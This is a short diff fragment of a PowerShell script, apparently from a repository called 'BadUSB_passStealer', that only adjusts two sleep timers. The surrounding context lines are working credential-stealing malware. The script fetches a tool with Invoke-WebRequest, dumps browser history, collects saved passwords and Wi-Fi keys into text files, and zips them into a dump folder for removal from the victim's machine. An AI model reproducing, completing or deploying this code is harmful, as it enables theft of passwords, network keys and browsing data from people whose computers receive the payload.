@@ -27,7 +27,7 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt # Create the file for browser history 
 # Wait for the files to be fully written
 while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt")) {
-    Start-Sleep -Seconds 1
+    Start-Sleep -Seconds 3
 }
 
 Move-Item passwords.txt, wifi.txt -Destination "$dumpFolder"
@@ -37,7 +37,7 @@ Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
 # Wait until the ZIP file is created
 while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 1
 }
 
 
